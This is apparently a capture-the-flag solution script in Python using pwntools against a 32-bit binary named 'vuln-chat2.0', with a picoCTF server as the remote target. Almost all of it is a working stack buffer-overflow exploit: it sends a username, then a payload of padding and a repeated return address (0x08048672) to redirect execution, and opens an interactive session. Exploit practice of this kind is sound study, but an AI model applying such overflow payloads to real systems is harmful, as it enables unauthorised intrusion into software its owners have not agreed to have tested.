#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./vuln-chat2.0", checksec=False)
#libc = ELF("/tmp/libc6_2.35-0ubuntu3.10_i386.so", checksec=False)

info = lambda msg, x: log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

if args.REMOTE:
    p = remote("rhea.picoctf.net", 53917)
else:
    p = process()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x0804863B
        c
	''')
    #input()

sla(b"Enter your username: ", b"A")
payload = b"A"*3 + p32(0x08048672)*9 + b"\0"
#payload = b"B"*35 + b"C"*8 + b"\x72\x86"
sa(b"A: ", payload)

p.interactive()
